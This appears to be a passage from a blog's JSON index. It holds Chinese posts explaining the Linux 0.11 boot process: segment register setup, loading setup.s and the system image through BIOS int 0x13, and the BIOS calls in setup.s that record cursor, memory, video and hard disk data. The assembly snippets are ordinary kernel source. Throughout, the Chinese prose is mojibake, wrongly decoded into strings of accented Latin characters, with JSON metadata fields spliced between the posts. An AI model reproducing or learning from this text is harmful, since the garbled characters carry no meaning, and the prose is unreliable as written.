ä¸ºæ•°æ®æ®µå¯„å­˜å™¨ï¼Œä¹‹å‰æˆ‘ä»¬è¯´è¿‡äº†ï¼Œå½“æ—¶å®ƒè¢«å¤åˆ¶ä¸º 0x07c0ï¼Œæ˜¯å› ä¸ºä¹‹å‰çš„ä»£ç åœ¨ 0x7c00 å¤„ï¼Œç°åœ¨ä»£ç å·²ç»è¢«æŒªåˆ°äº† 0x90000 å¤„ï¼Œæ‰€ä»¥ç°åœ¨è‡ªç„¶åˆæ”¹èµ‹å€¼ä¸º 0x9000 äº†ã€‚ es æ˜¯æ‰©å±•æ®µå¯„å­˜å™¨ï¼Œä»…ä»…æ˜¯ä¸ªæ‰©å±•ï¼Œä¸æ˜¯ä¸»è§’ï¼Œå…ˆä¸ç”¨ç†å®ƒã€‚ ss ä¸ºæ ˆæ®µå¯„å­˜å™¨ï¼Œåé¢è¦é…åˆæ ˆåŸºå€å¯„å­˜å™¨ sp æ¥è¡¨ç¤ºæ­¤æ—¶çš„æ ˆé¡¶åœ°å€ã€‚è€Œæ­¤æ—¶ sp å¯„å­˜å™¨è¢«èµ‹å€¼ä¸ºäº† 0xFF00 äº†ï¼Œæ‰€ä»¥ç›®å‰çš„æ ˆé¡¶åœ°å€å°±æ˜¯ ss:sp æ‰€æŒ‡å‘çš„åœ°å€ 0x9FF00 å¤„ã€‚ å…¶å®åˆ°è¿™é‡Œï¼Œæ“ä½œç³»ç»Ÿçš„ä¸€äº›æœ€æœ€æœ€æœ€åŸºç¡€çš„å‡†å¤‡å·¥ä½œï¼Œå°±åšå¥½äº†ã€‚éƒ½åšäº†äº›å•¥äº‹å‘¢ï¼Ÿ ç¬¬ä¸€ï¼Œä»£ç ä»ç¡¬ç›˜ç§»åˆ°å†…å­˜ï¼Œåˆä»å†…å­˜æŒªäº†ä¸ªåœ°æ–¹ï¼Œæ”¾åœ¨äº† 0x90000 å¤„ã€‚ ç¬¬äºŒï¼Œæ•°æ®æ®µå¯„å­˜å™¨ ds å’Œä»£ç æ®µå¯„å­˜å™¨ cs æ­¤æ—¶éƒ½è¢«è®¾ç½®ä¸ºäº† 0x9000ï¼Œä¹Ÿå°±ä¸ºè·³è½¬ä»£ç å’Œè®¿é—®å†…å­˜æ•°æ®ï¼Œå¥ å®šäº†åŒä¸€ä¸ªå†…å­˜çš„åŸºå€åœ°å€ï¼Œæ–¹ä¾¿äº†è·³è½¬å’Œå†…å­˜è®¿é—®ï¼Œå› ä¸ºä»…ä»…éœ€è¦æŒ‡å®šåç§»åœ°å€å³å¯äº†ã€‚ ç¬¬ä¸‰ï¼Œæ ˆé¡¶åœ°å€è¢«è®¾ç½®ä¸ºäº† 0x9FF00ï¼Œå…·ä½“è¡¨ç°ä¸ºæ ˆæ®µå¯„å­˜å™¨ ss ä¸º 0x9000ï¼Œæ ˆåŸºå€å¯„å­˜å™¨ sp ä¸º 0xFF00ã€‚æ ˆæ˜¯å‘ä¸‹å‘å±•çš„ï¼Œè¿™ä¸ªæ ˆé¡¶åœ°å€ 0x9FF00 è¦è¿œè¿œå¤§äºæ­¤æ—¶ä»£ç æ‰€åœ¨çš„ä½ç½® 0x90000ï¼Œæ‰€ä»¥æ ˆå‘ä¸‹å‘å±•å°±å¾ˆéš¾æ’è§ä»£ç æ‰€åœ¨çš„ä½ç½®ï¼Œä¹Ÿå°±æ¯”è¾ƒå®‰å…¨ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆç»™æ ˆé¡¶åœ°å€è®¾ç½®ä¸ºè¿™ä¸ªå€¼çš„åŸå› ï¼Œå…¶å®åªéœ€è¦ç¦»ä»£ç çš„ä½ç½®è¿œè¿œçš„å³å¯ã€‚ åšå¥½è¿™äº›åŸºç¡€å·¥ä½œåï¼Œæ¥ä¸‹æ¥å°±åˆè¯¥æŠ˜è…¾äº†å…¶ä»–äº‹äº†ã€‚ æ€»ç»“æ‹”é«˜ä¸€ä¸‹ï¼Œè¿™ä¸€éƒ¨åˆ†å…¶å®å°±æ˜¯æŠŠä»£ç æ®µå¯„å­˜å™¨ csï¼Œæ•°æ®æ®µå¯„å­˜å™¨ dsï¼Œæ ˆæ®µå¯„å­˜å™¨ ss å’Œæ ˆåŸºå€å¯„å­˜å™¨ sp åˆ†åˆ«è®¾ç½®å¥½äº†å€¼ï¼Œæ–¹ä¾¿åç»­ä½¿ç”¨ã€‚ å†æ‹”é«˜ä¸€ä¸‹ï¼Œå…¶å®æ“ä½œç³»ç»Ÿåœ¨åšçš„äº‹æƒ…ï¼Œå°±æ˜¯ç»™å¦‚ä½•è®¿é—®ä»£ç ï¼Œå¦‚ä½•è®¿é—®æ•°æ®ï¼Œå¦‚ä½•è®¿é—®æ ˆè¿›è¡Œäº†ä¸€ä¸‹å†…å­˜çš„åˆæ­¥è§„åˆ’ã€‚å…¶ä¸­è®¿é—®ä»£ç å’Œè®¿é—®æ•°æ®çš„è§„åˆ’æ–¹å¼å°±æ˜¯è®¾ç½®äº†ä¸€ä¸ªåŸºå€è€Œå·²ï¼Œè®¿é—®æ ˆå°±æ˜¯æŠŠæ ˆé¡¶æŒ‡é’ˆæŒ‡å‘äº†ä¸€ä¸ªè¿œç¦»ä»£ç ä½ç½®çš„åœ°æ–¹è€Œå·²ã€‚ æ‰€ä»¥ï¼Œåƒä¸‡åˆ«å¤šæƒ³ï¼Œå°±è¿™ä¹ˆç‚¹äº‹å„¿ã€‚é‚£å†ç»™å¤§å®¶ç•™ä¸ªä½œä¸šï¼ŒæŠŠå½“å‰çš„å†…å­˜å¸ƒå±€ç”»å‡ºæ¥ï¼Œå‘Šè¯‰æˆ‘ç°åœ¨ csã€ipã€dsã€ssã€sp è¿™äº›å¯„å­˜å™¨çš„å€¼ï¼Œåœ¨å†…å­˜å¸ƒå±€ä¸­çš„ä½ç½®ã€‚ å¥½äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åº”è¯¥å¹²ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬å›å¿†ä¸‹ï¼Œæˆ‘ä»¬ç›®å‰ä»…ä»…æŠŠç¡¬ç›˜ä¸­ 512 å­—èŠ‚åŠ è½½åˆ°å†…å­˜ä¸­äº†ï¼Œä½†æ“ä½œç³»ç»Ÿè¿˜æœ‰å¾ˆå¤šä»£ç ä»ç„¶åœ¨ç¡¬ç›˜é‡Œï¼Œä¸èƒ½æŠ›ä¸‹ä»–ä»¬ä¸ç®¡å‘€ã€‚ æ‰€ä»¥ä½ çŒœä¸‹ä¸€æ­¥è¦å¹²å˜›äº†ï¼Ÿ åé¢çš„ä¸–ç•Œè¶Šæ¥è¶Šç²¾å½©ï¼Œæ¬²çŸ¥åäº‹å¦‚ä½•ï¼Œä¸”å¬ä¸‹å›åˆ†è§£ã€‚ â€”â€”- æœ¬å›æ‰©å±•ä¸å»¶ä¼¸ â€”â€”- æœ‰å…³æ®µå¯„å­˜å™¨çš„è¯¦ç»†ä¿¡æ¯ï¼Œå¯ä»¥å‚è€ƒ Intel æ‰‹å†Œï¼š Volume 1 Chapter 3.4.2 Segment Registers å…¶ä¸­æœ‰ä¸€å¼ å›¾æ¸…æ™°åœ°æè¿°äº†ä¸‰ç§æ®µå¯„å­˜å™¨çš„ä½œç”¨ã€‚ æ­£å¦‚æˆ‘ä»¬æœ¬å›æ‰€æ¶‰åŠåˆ°çš„è®²è¿°ä¸€æ ·ï¼ŒCS æ˜¯ä»£ç æ®µå¯„å­˜å™¨ï¼Œå°±æ˜¯æ‰§è¡Œä»£ç çš„æ—¶å€™å¸¦ç€è¿™é‡Œå­˜çš„åŸºåœ°å€ã€‚DS æ˜¯æ•°æ®æ®µå¯„å­˜å™¨ï¼Œå°±æ˜¯è®¿é—®æ•°æ®çš„æ—¶å€™å¸¦ç€è¿™é‡Œçš„åŸºåœ°å€ã€‚SS æ˜¯æ ˆæ®µå¯„å­˜å™¨ï¼Œå°±æ˜¯è®¿é—®æ ˆæ—¶å¸¦ç€è¿™é‡Œçš„åŸºåœ°å€ã€‚ æ‰€ä»¥æœ¬å›çš„ä»£ç ï¼Œæ­£å¦‚æ ‡é¢˜æ‰€è¯´ï¼Œå°±æ˜¯åšå¥½æœ€æœ€åŸºç¡€çš„å‡†å¤‡å·¥ä½œã€‚ä½†è¦ä»æ›´ä¼Ÿå¤§çš„æˆ˜ç•¥æ„ä¹‰ä¸Šè®²ï¼Œå®ƒå…¶å®æ˜¯æŒ‰ç…§ Intel æ‰‹å†Œä¸Šè¦æ±‚çš„ï¼Œè€è€å®å®æŠŠè¿™ä¸‰ç±»æ®µå¯„å­˜å™¨çš„å€¼è®¾ç½®å¥½ï¼Œè¾¾åˆ°äº†åˆæ­¥è§„åˆ’å†…å­˜çš„ç›®çš„ã€‚ ","date":"2021-12-10","objectID":"/2021/12/linux-0.11-02/:1:0","tags":["Linux","kernel"],"title":"Linux-0.11-02","uri":"/2021/12/linux-0.11-02/"},{"categories":["LINUX"],"content":"04 æŠŠè‡ªå·±åœ¨ç¡¬ç›˜é‡Œçš„å…¶ä»–éƒ¨åˆ†ä¹Ÿæ”¾åˆ°å†…å­˜æ¥ åšå¥½è¿™äº›åŸºç¡€å·¥ä½œåï¼Œæ¥ä¸‹æ¥å°±åˆè¯¥æ–°çš„ä¸€ç¿»æŠ˜è…¾äº†ï¼Œæˆ‘ä»¬æ¥ç€å¾€ä¸‹çœ‹ã€‚ load_setup: mov dx,#0x0000 ; drive 0, head 0 mov cx,#0x0002 ; sector 2, track 0 mov bx,#0x0200 ; address = 512, in 0x9000 mov ax,#0x0200+4 ; service 2, nr of sectors int 0x13 ; read it jnc ok_load_setup ; ok - continue mov dx,#0x0000 mov ax,#0x0000 ; reset the diskette int 0x13 jmp load_setup ok_load_setup: ... è¿™é‡Œæœ‰ä¸¤ä¸ª int æŒ‡ä»¤æˆ‘ä»¬è¿˜æ²¡è§è¿‡ã€‚ æ³¨æ„è¿™ä¸ª int æ˜¯æ±‡ç¼–æŒ‡ä»¤ï¼Œå¯ä¸æ˜¯é«˜çº§è¯­è¨€çš„æ•´å‹å˜é‡å“Ÿã€‚int 0x13 è¡¨ç¤ºå‘èµ· 0x13 å·ä¸­æ–­ï¼Œè¿™æ¡æŒ‡ä»¤ä¸Šé¢ç»™ dxã€cxã€bxã€ax èµ‹å€¼éƒ½æ˜¯ä½œä¸ºè¿™ä¸ªä¸­æ–­ç¨‹åºçš„å‚æ•°ã€‚ ä¸­æ–­æ˜¯å•¥å¦‚æœä½ ä¸ç†è§£ï¼Œå…ˆä¸è¦ç®¡ï¼Œå¦‚æœä½ å°±æ˜¯æ”¾ä¸ä¸‹ï¼Œé‚£å¯ä»¥çœ‹ä¸€çœ¼æˆ‘ä¹‹å‰çš„æ–‡ç« ï¼šè®¤è®¤çœŸçœŸçš„èŠèŠä¸­æ–­ï¼Œé‡Œé¢è®²å¾—éå¸¸ç»†è‡´ã€‚ æ€»ä¹‹è¿™ä¸ªä¸­æ–­å‘èµ·åï¼ŒCPU ä¼šé€šè¿‡è¿™ä¸ªä¸­æ–­å·ï¼Œå»å¯»æ‰¾å¯¹åº”çš„ä¸­æ–­å¤„ç†ç¨‹åºçš„å…¥å£åœ°å€ï¼Œå¹¶è·³è½¬è¿‡å»æ‰§è¡Œï¼Œé€»è¾‘ä¸Šå°±ç›¸å½“äºæ‰§è¡Œäº†ä¸€ä¸ªå‡½æ•°ã€‚è€Œ 0x13 å·ä¸­æ–­çš„å¤„ç†ç¨‹åºæ˜¯ BIOS æå‰ç»™æˆ‘ä»¬å†™å¥½çš„ï¼Œæ˜¯è¯»å–ç£ç›˜çš„ç›¸å…³åŠŸèƒ½çš„å‡½æ•°ã€‚ ä¹‹åçœŸæ­£è¿›å…¥æ“ä½œç³»ç»Ÿå†…æ ¸åï¼Œä¸­æ–­å¤„ç†ç¨‹åºæ˜¯éœ€è¦æˆ‘ä»¬è‡ªå·±å»é‡æ–°å†™çš„ï¼Œè¿™ä¸ªåœ¨åé¢çš„ç« èŠ‚ä¸­ï¼Œä½ ä¼šä¸æ–­çœ‹åˆ°å„ä¸ªæ¨¡å—æ³¨å†Œè‡ªå·±ç›¸å…³çš„ä¸­æ–­å¤„ç†ç¨‹åºï¼Œæ‰€ä»¥ä¸è¦æ€¥ã€‚æ­¤æ—¶ä¸ºäº†æ–¹ä¾¿å°±å…ˆç”¨ BIOS æå‰ç»™æˆ‘ä»¬å†™å¥½çš„ç¨‹åºäº†ã€‚ å¯è§å³ä¾¿æ˜¯æ“ä½œç³»ç»Ÿçš„æºç ï¼Œæœ‰æ—¶ä¹Ÿéœ€è¦å»è°ƒç”¨ç°æˆçš„å‡½æ•°æ–¹ä¾¿è‡ªå·±ï¼Œå¹¶ä¸æ˜¯é€ è½®å­çš„äººå°±éå¾—å®Œå…¨ä»å¤´é€ ã€‚ æœ¬æ®µä»£ç çš„æ³¨é‡Šå·²ç»å†™çš„å¾ˆæ˜ç¡®äº†ï¼Œç›´æ¥è¯´æœ€ç»ˆçš„ä½œç”¨å§ï¼Œå°±æ˜¯å°†ç¡¬ç›˜çš„ç¬¬ 2 ä¸ªæ‰‡åŒºå¼€å§‹ï¼ŒæŠŠæ•°æ®åŠ è½½åˆ°å†…å­˜ 0x90200 å¤„ï¼Œå…±åŠ è½½ 4 ä¸ªæ‰‡åŒºï¼Œå›¾ç¤ºå…¶å®å°±æ˜¯è¿™æ ·ã€‚ ä¸ºäº†å›¾ç‰‡æ¸…æ™°è¡¨è¾¾æ„æ€ï¼Œå¯èƒ½æ¯”ä¾‹å°±ä¸é‚£ä¹ˆä¸¥è°¨äº†ï¼Œå¤§å®¶ä¸å¿…çº ç»“ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœå¤åˆ¶æˆåŠŸï¼Œå°±è·³è½¬åˆ° ok_load_setup è¿™ä¸ªæ ‡ç­¾ï¼Œå¦‚æœå¤±è´¥ï¼Œåˆ™ä¼šä¸æ–­é‡å¤æ‰§è¡Œè¿™æ®µä»£ç ï¼Œä¹Ÿå°±æ˜¯é‡è¯•ã€‚é‚£æˆ‘ä»¬å°±åˆ«ç®¡é‡è¯•é€»è¾‘äº†ï¼Œç›´æ¥çœ‹æˆåŠŸåè·³è½¬çš„ ok_load_setup è¿™ä¸ªæ ‡ç­¾åçš„ä»£ç ã€‚ ok_load_setup: ... mov ax,#0x1000 mov es,ax ; segment of 0x10000 call read_it ... jmpi 0,0x9020 è¿™æ®µä»£ç çœç•¥äº†å¾ˆå¤šéä¸»é€»è¾‘çš„ä»£ç ï¼Œæ¯”å¦‚åœ¨å±å¹•ä¸Šè¾“å‡º Loading system â€¦ è¿™ä¸ªå­—ç¬¦ä¸²ä»¥é˜²æ­¢ç”¨æˆ·ç­‰çƒ¦äº†ã€‚ å‰©ä¸‹çš„ä¸»è¦ä»£ç å°±éƒ½å†™åœ¨è¿™é‡Œäº†ï¼Œå°±è¿™ä¹ˆå‡ è¡Œï¼Œå…¶ä½œç”¨æ˜¯æŠŠä»ç¡¬ç›˜ç¬¬ 6 ä¸ªæ‰‡åŒºå¼€å§‹å¾€åçš„ 240 ä¸ªæ‰‡åŒºï¼ŒåŠ è½½åˆ°å†…å­˜ 0x10000 å¤„ï¼Œå’Œä¹‹å‰çš„ä»ç¡¬ç›˜æ£è…¾åˆ°å†…å­˜æ˜¯ä¸€ä¸ªé“ç†ã€‚ è‡³æ­¤ï¼Œæ•´ä¸ªæ“ä½œç³»ç»Ÿçš„å…¨éƒ¨ä»£ç ï¼Œå°±å·²ç»å…¨éƒ¨ä»ç¡¬ç›˜ä¸­ï¼Œè¢«æ¬è¿åˆ°å†…å­˜æ¥äº†ã€‚ ç„¶ååˆé€šè¿‡ä¸€ä¸ªç†Ÿæ‚‰çš„æ®µé—´è·³è½¬æŒ‡ä»¤ jmpi 0,0x9020ï¼Œè·³è½¬åˆ° 0x90200 å¤„ï¼Œå°±æ˜¯ç¡¬ç›˜ç¬¬äºŒä¸ªæ‰‡åŒºå¼€å§‹å¤„çš„å†…å®¹ã€‚ é‚£è¿™é‡Œçš„å†…å®¹æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå…ˆä¸æ€¥ï¼Œæˆ‘ä»¬å€Ÿè¿™ä¸ªæœºä¼šæŠŠæ•´ä¸ªæ“ä½œç³»ç»Ÿçš„ç¼–è¯‘è¿‡ç¨‹è¯´ä¸‹ã€‚æ•´ä¸ªç¼–è¯‘è¿‡ç¨‹ï¼Œå°±æ˜¯é€šè¿‡ Makefile å’Œ build.c é…åˆå®Œæˆçš„ï¼Œæœ€ç»ˆä¼šï¼š 1. æŠŠ bootsect.s ç¼–è¯‘æˆ bootsect æ”¾åœ¨ç¡¬ç›˜çš„ 1 æ‰‡åŒºã€‚ 2. æŠŠ setup.s ç¼–è¯‘æˆ setup æ”¾åœ¨ç¡¬ç›˜çš„ 2~5 æ‰‡åŒºã€‚ 3. æŠŠå‰©ä¸‹çš„å…¨éƒ¨ä»£ç ï¼ˆhead.s ä½œä¸ºå¼€å¤´ï¼‰ç¼–è¯‘æˆ system æ”¾åœ¨ç¡¬ç›˜çš„éšå 240 ä¸ªæ‰‡åŒºã€‚ æ‰€ä»¥æ•´ä¸ªè·¯å¾„å°±æ˜¯è¿™æ ·çš„ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬å³å°†è·³è½¬åˆ°çš„å†…å­˜ä¸­çš„ 0x90200 å¤„çš„ä»£ç ï¼Œå°±æ˜¯ä»ç¡¬ç›˜ç¬¬äºŒä¸ªæ‰‡åŒºå¼€å§‹å¤„åŠ è½½åˆ°å†…å­˜çš„ã€‚ç¬¬äºŒä¸ªæ‰‡åŒºçš„æœ€å¼€å§‹å¤„ï¼Œé‚£ä¹Ÿå°±æ˜¯ setup.s æ–‡ä»¶çš„ç¬¬ä¸€è¡Œä»£ç å’¯ã€‚ é‚£è¿™ä¸ªä»£ç æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬åé¢å†è¯´ï¼Œä¸è¿‡å…ˆæ‰“å¼€ setup.s è¿™ä¸ªæ–‡ä»¶çœ‹çœ‹å§ã€‚ start: mov ax,#0x9000 ; this is done in bootsect already, but... mov ds,ax mov ah,#0x03 ; read cursor pos xor bh,bh int 0x10 ; save it in known place, con_init fetches mov [0],dx ; it from 0x90000. ... å¥½äº†ï¼Œåˆ°ç›®å‰ä¸ºæ­¢ï¼Œä½ æ˜¯ä¸æ˜¯è§‰å¾—ï¼Œæˆ‘å»ï¼Œè¿™å‰é¢ç¼–è¯‘æ”¾åœ¨ç¡¬ç›˜çš„ä½ç½®ï¼Œå’Œåé¢ä»£ç å†™æ­»çš„è·³è½¬åœ°å€ï¼Œç«Ÿç„¶å¦‚æ­¤åœ°å¼ºè€¦åˆï¼Ÿé‚£ä¸‡ä¸€æ•´é”™äº†å’‹åŠã€‚ æ˜¯å•Šï¼Œå°±æ˜¯è¿™æ ·ï¼Œä½ ä»¥ä¸ºå‘¢ï¼Ÿåœ¨æ“ä½œç³»ç»Ÿåˆšåˆšå¼€å§‹å»ºç«‹çš„æ—¶å€™ï¼Œé‚£æ˜¯å®Œå…¨è‡ªå·±å®‰æ’å‰å‰ååçš„å…³ç³»ï¼Œä¸€ä¸ªå­—èŠ‚éƒ½ä¸èƒ½åï¼Œå°±æ˜¯è¿™ä¹ˆå¼ºè€¦åˆï¼Œéœ€è¦å°å¿ƒç¿¼ç¿¼ï¼Œéœ€è¦å¤§è„‘æ—¶åˆ»ä¿æŒæ¸…é†’ï¼Œè§„åˆ’å¥½è‡ªå·±å†™çš„ä»£ç è¢«ç¼–è¯‘å¹¶å­˜å‚¨åœ¨ç¡¬ç›˜çš„å“ªä¸ªä½ç½®ï¼Œè€Œéšååˆä¼šè¢«åŠ è½½åˆ°å†…å­˜çš„å“ªä¸ªä½ç½®ï¼Œä¸èƒ½é”™ä¹±ã€‚ ä½†è¿™ä¹Ÿæ˜¯å¾ˆæœ‰å¥½å¤„çš„ï¼Œé‚£å°±æ˜¯åœ¨è¿™ä¸ªé˜¶æ®µï¼Œä½ å®Œå®Œå…¨å…¨çŸ¥é“æ¯ä¸€æ­¥è·³è½¬ï¼Œæ¯ä¸€æ­¥æ•°æ®è®¿é—®éƒ½æ˜¯æ€ä¹ˆè®¾è®¡å’Œè§„åˆ’çš„ï¼Œä¸å­˜åœ¨é»‘ç›’ã€‚ ä¸åƒæˆ‘ä»¬åœ¨å†™é«˜çº§è¯­è¨€çš„æ—¶å€™ï¼Œå®Œå…¨ä¸çŸ¥é“æ˜¯æ€ä¹ˆåº•å±‚å¸®æˆ‘ä»¬åšäº†å¤šå°‘å·¥ä½œã€‚è™½ç„¶è¿™è§£è„±äº†ç¨‹åºå‘˜å…³å¿ƒåº•å±‚ç»†èŠ‚çš„çƒ¦æ¼ï¼Œä½†åœ¨é‡åˆ°é—®é¢˜æˆ–è€…æƒ³çŸ¥é“åŸç†çš„æ—¶å€™ï¼Œå°±æ˜¾å¾—å¾ˆè®¨åŒäº†ã€‚æ‰€ä»¥çæƒœè¿™ä¸ªé˜¶æ®µå§ï¼ è€Œä¸”ï¼Œä½ åœ¨ä¸Šå±‚ä¹‹æ‰€ä»¥èƒ½é‚£ä¹ˆéšå¿ƒæ‰€æ¬²ï¼Œå¾ˆå¤šåº•å±‚ç»†èŠ‚å®Œå…¨ä¸ç”¨è€ƒè™‘ï¼Œå¾ˆçœå¿ƒï¼Œæ­£æ˜¯å› ä¸ºåƒä»Šå¤©è¿™æ ·ä»¥åŠä¹‹åæ¯ä¸€ç« çš„å„ç§åº•å±‚ä»£ç å°å¿ƒç¿¼ç¿¼çš„åšäº†å¾ˆå¤šé“ºå«ã€‚ å¥½äº†ï¼Œæœ¬æ–‡çš„å†…å®¹å°±ç»“æŸäº†ã€‚è¿™ä¹Ÿæ ‡å¿—ç€æˆ‘ä»¬èµ°å®Œäº†ç¬¬ä¸€ä¸ªæ“ä½œç³»ç»Ÿæºç æ–‡ä»¶ bootsect.sï¼Œå¼€å§‹å‘ä¸‹ä¸€ä¸ªæ–‡ä»¶ setup.s è¿›å‘äº†ï¼ åé¢çš„ä¸–ç•Œè¶Šæ¥è¶Šç²¾å½©ï¼Œæ¬²çŸ¥åäº‹å¦‚ä½•ï¼Œä¸”å¬ä¸‹å›åˆ†è§£ã€‚ ","date":"2021-12-10","objectID":"/2021/12/linux-0.11-02/:2:0","tags":["Linux","kernel"],"title":"Linux-0.11-02","uri":"/2021/12/linux-0.11-02/"},{"categories":["LINUX"],"content":"05 è¿›å…¥ä¿æŠ¤æ¨¡å¼é’±çš„æœ€åä¸€æ¬¡æŠ˜è…¾å†…å­˜ ä¹¦æ¥ä¸Šå›ï¼Œä¸Šå›ä¹¦å’±ä»¬è¯´åˆ°ï¼Œæ“ä½œç³»ç»Ÿå·²ç»å®Œæˆäº†å„ç§ä»ç¡¬ç›˜åˆ°å†…å­˜çš„åŠ è½½ï¼Œä»¥åŠå†…å­˜åˆ°å†…å­˜çš„å¤åˆ¶ã€‚ è‡³æ­¤ï¼Œæ•´ä¸ª bootsect.s çš„ä½¿å‘½å°±å®Œæˆäº†ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å“è¯»å®Œçš„ç¬¬ä¸€ä¸ªæ“ä½œç³»ç»Ÿæºç æ–‡ä»¶ã€‚ä¹‹åä¾¿è·³è½¬åˆ°äº† 0x90200 è¿™ä¸ªä½ç½®å¼€å§‹æ‰§è¡Œï¼Œè¿™ä¸ªä½ç½®å¤„çš„ä»£ç å°±æ˜¯ä½äº setup.s çš„å¼€å¤´ï¼Œæˆ‘ä»¬æ¥ç€æ¥çœ‹ã€‚ start: mov ax,#0x9000 ; this is done in bootsect already, but... mov ds,ax mov ah,#0x03 ; read cursor pos xor bh,bh int 0x10 ; save it in known place, con_init fetches mov [0],dx ; it from 0x90000. åˆæœ‰ä¸ª int æŒ‡ä»¤ã€‚ å‰é¢çš„æ–‡ç« å¥½å¥½çœ‹è¿‡çš„è¯ï¼Œä¸€ä¸‹å°±èƒ½çŒœå‡ºå®ƒè¦å¹²å˜›ã€‚è¿˜è®°ä¸è®°å¾—ä¹‹å‰æœ‰ä¸ª int 0x13 è¡¨ç¤ºè§¦å‘ BIOS æä¾›çš„è¯»ç£ç›˜ä¸­æ–­ç¨‹åºï¼Ÿè¿™ä¸ª int 0x10 ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå®ƒä¹Ÿæ˜¯è§¦å‘ BIOS æä¾›çš„æ˜¾ç¤ºæœåŠ¡ä¸­æ–­å¤„ç†ç¨‹åºï¼Œè€Œ ah å¯„å­˜å™¨è¢«èµ‹å€¼ä¸º 0x03 è¡¨ç¤ºæ˜¾ç¤ºæœåŠ¡é‡Œå…·ä½“çš„è¯»å–å…‰æ ‡ä½ç½®åŠŸèƒ½ã€‚ å…·ä½“ BIOS æä¾›äº†å“ªäº›ä¸­æ–­æœåŠ¡ï¼Œå¦‚ä½•å»è°ƒç”¨å’Œè·å–è¿”å›å€¼ï¼Œè¯·å¤§å®¶è‡ªè¡Œå¯»æ‰¾èµ„æ–™ï¼Œè¿™é‡Œåªè¯´ç»“æœã€‚ è¿™ä¸ª int 0x10 ä¸­æ–­ç¨‹åºæ‰§è¡Œå®Œæ¯•å¹¶è¿”å›æ—¶ï¼Œdx å¯„å­˜å™¨é‡Œçš„å€¼è¡¨ç¤ºå…‰æ ‡çš„ä½ç½®ï¼Œå…·ä½“è¯´æ¥å…¶é«˜å…«ä½ dh å­˜å‚¨äº†è¡Œå·ï¼Œä½å…«ä½ dl å­˜å‚¨äº†åˆ—å·ã€‚ è¿™é‡Œè¯´æ˜ä¸€ä¸‹ï¼šè®¡ç®—æœºåœ¨åŠ ç”µè‡ªæ£€åä¼šè‡ªåŠ¨åˆå§‹åŒ–åˆ°æ–‡å­—æ¨¡å¼ï¼Œåœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œä¸€å±å¹•å¯ä»¥æ˜¾ç¤º 25 è¡Œï¼Œæ¯è¡Œ 80 ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ 80 åˆ—ã€‚ é‚£ä¸‹ä¸€æ­¥ mov [0],dx å°±æ˜¯æŠŠè¿™ä¸ªå…‰æ ‡ä½ç½®å­˜å‚¨åœ¨ [0] è¿™ä¸ªå†…å­˜åœ°å€å¤„ã€‚æ³¨æ„ï¼Œå‰é¢æˆ‘ä»¬è¯´è¿‡ï¼Œè¿™ä¸ªå†…å­˜åœ°å€ä»…ä»…æ˜¯åç§»åœ°å€ï¼Œè¿˜éœ€è¦åŠ ä¸Š ds è¿™ä¸ªå¯„å­˜å™¨é‡Œå­˜å‚¨çš„æ®µåŸºå€ï¼Œæœ€ç»ˆçš„å†…å­˜åœ°å€æ˜¯åœ¨ 0x90000 å¤„ï¼Œè¿™é‡Œå­˜æ”¾ç€å…‰æ ‡çš„ä½ç½®ï¼Œä»¥ä¾¿ä¹‹ååœ¨åˆå§‹åŒ–æ§åˆ¶å°çš„æ—¶å€™ç”¨åˆ°ã€‚ æ‰€ä»¥ä»è¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œè¿™å’Œæˆ‘ä»¬å¹³æ—¶è°ƒç”¨ä¸€ä¸ªæ–¹æ³•æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œåªä¸è¿‡è¿™é‡Œçš„å¯„å­˜å™¨çš„ç”¨æ³•ç›¸å½“äºå…¥å‚å’Œè¿”å›å€¼ï¼Œè¿™é‡Œçš„ 0x10 ä¸­æ–­å·ç›¸å½“äºæ–¹æ³•åã€‚ è¿™é‡Œåˆåº”äº†ä¹‹å‰è¯´çš„ä¸€å¥è¯ï¼Œæ“ä½œç³»ç»Ÿå†…æ ¸çš„æœ€å¼€å§‹ä¹Ÿå¤„å¤„éƒ½æ˜¯ BIOS çš„è°ƒåŒ…ä¾ ï¼Œæœ‰ç°æˆçš„å°±ç”¨å‘—ã€‚ å†æ¥ä¸‹æ¥çš„å‡ è¡Œä»£ç ï¼Œéƒ½æ˜¯å’Œåˆšåˆšä¸€æ ·çš„é€»è¾‘ï¼Œè°ƒç”¨ä¸€ä¸ª BIOS ä¸­æ–­è·å–ç‚¹ä»€ä¹ˆä¿¡æ¯ï¼Œç„¶åå­˜å‚¨åœ¨å†…å­˜ä¸­æŸä¸ªä½ç½®ï¼Œæˆ‘ä»¬è¿…é€Ÿæµè§ˆä¸€ä¸‹å°±å¥½å’¯ã€‚ æ¯”å¦‚è·å–å†…å­˜ä¿¡æ¯ã€‚ ; Get memory size (extended mem, kB) mov ah,#0x88 int 0x15 mov [2],ax è·å–æ˜¾å¡æ˜¾ç¤ºæ¨¡å¼ã€‚ ; Get video-card data: mov ah,#0x0f int 0x10 mov [4],bx ; bh = display page mov [6],ax ; al = video mode, ah = window width æ£€æŸ¥æ˜¾ç¤ºæ–¹å¼å¹¶å–å‚æ•° ; check for EGA/VGA and some config parameters mov ah,#0x12 mov bl,#0x10 int 0x10 mov [8],ax mov [10],bx mov [12],cx è·å–ç¬¬ä¸€å—ç¡¬ç›˜çš„ä¿¡æ¯ã€‚ ; Get hd0 data mov ax,#0x0000 mov ds,ax lds si,[4*0x41] mov ax,#INITSEG mov es,ax mov di,#0x0080 mov cx,#0x10 rep movsb è·å–ç¬¬äºŒå—ç¡¬ç›˜çš„ä¿¡æ¯ã€‚ ; Get hd1 data mov ax,#0x0000 mov ds,ax lds si,[4*0x46] mov ax,#INITSEG mov es,ax mov di,#0x0090 mov cx,#0x10 rep movsb ä»¥ä¸ŠåŸç†éƒ½æ˜¯ä¸€æ ·çš„ã€‚ 